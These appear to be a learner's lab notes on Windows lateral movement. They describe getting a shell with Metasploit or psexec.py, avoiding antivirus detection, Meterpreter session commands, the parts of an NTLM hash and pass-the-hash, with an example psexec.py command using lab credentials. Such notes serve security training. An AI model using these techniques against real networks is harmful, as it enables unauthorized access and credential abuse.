
Metasploit but there are chances that it could get picked up
but there are alternatives.

Not get picked up as much as Metasploit.
psexec.py


Pass the hash
Could also use the hash if we are not able to crack the hash


Meterpreter command
```
background
```

```
sessions
```

 
 Now you know that we have NTLM so let's explore which part is which
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
```

LM
```
aad3b435b51404eeaad3b435b51404ee
```

NT
```
7facdc498ed1680c4fd1448319a8c04f
```

But we need the whole hash when doing pass the hash attacks.

```
psexec.py MARVEL/fcastle:'Password1'@192.168.17.140
```
but but but as the AV is on it will get picked up and we won't be able to get the shell

![[Pasted image 20240122204822.png]]

![[Pasted image 20240122204923.png]]

